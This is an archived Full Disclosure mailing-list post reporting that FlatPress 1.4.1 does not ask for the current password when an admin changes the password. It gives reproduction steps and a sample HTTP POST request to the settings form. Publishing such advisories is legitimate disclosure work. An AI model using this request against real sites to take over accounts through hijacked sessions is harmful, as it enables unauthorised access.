---
title: Current Password not Required When Changing Password -	flatpressv1.4.1
url: https://seclists.org/fulldisclosure/2025/Sep/62
source: Full Disclosure
date: 2025-09-24
fetch_date: 2025-10-02T20:36:13.966711
---

# Current Password not Required When Changing Password -	flatpressv1.4.1

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](61)
[By Date](date.html#62)
[![Next](/images/right-icon-16x16.png)](63)

[![Previous](/images/left-icon-16x16.png)](61)
[By Thread](index.html#62)
[![Next](/images/right-icon-16x16.png)](63)

![](/shared/images/nst-icons.svg#search)

# Current Password not Required When Changing Password - flatpressv1.4.1

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sun, 21 Sep 2025 17:30:59 +0100

---

```
# Exploit Title: Current Password not Required When Changing Password -
flatpressv1.4.1
# Date: 09/2025
# Exploit Author: Andrey Stoykov
# Version: 1.4.1
# Tested on: Debian 12
# Blog:
https://msecureltd.blogspot.com/2025/09/friday-fun-pentest-series-42-current.html

Current Password not Required When Changing Password:

Steps to Reproduce:

- Login with admin user and visit "Main" > "Configuration" > "General
Settings"
- Current password would not be required when changing the password

// HTTP POST Request

POST /FlatPressc4hak4mvef/admin.php?p=config&action=default HTTP/1.1
Host: demos5.softaculous.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0)
Gecko/20100101 Firefox/144.0
[...]

_wpnonce=c1d6797fb9&_wp_http_referer=%2FFlatPressc4hak4mvef%2Fadmin.php%3Fp%3Dconfig&admin=admin&password=&confirm_password=&title=FlatPress&subtitle=My+FlatPress+blog&blogfooter=&author=test&www=http%3A%2F%
2Fdemos5.softaculous.com%2FFlatPressc4hak4mvef%2F&email=demos%
40softaculous.com
&notify=on&startpage=%3ANULL%3A&maxentries=5&timeoffset=0&dateformat=%25A%2C+%25B+%25e%2C+%25Y&dateformatshort=%25Y-%25m-%25d&timeformat=%25H%3A%25M%3A%25S&lang=en-us&charset=utf-8&save=Save+Changes

// HTTP Response

HTTP/1.1 200 OK
Date: Sun, 21 Sep 2025 15:14:16 GMT
Server: FlatPress
[...]
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](61)
[By Date](date.html#62)
[![Next](/images/right-icon-16x16.png)](63)

[![Previous](/images/left-icon-16x16.png)](61)
[By Thread](index.html#62)
[![Next](/images/right-icon-16x16.png)](63)

### Current thread:

* **Current Password not Required When Changing Password - flatpressv1.4.1** *Andrey Stoykov (Sep 22)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")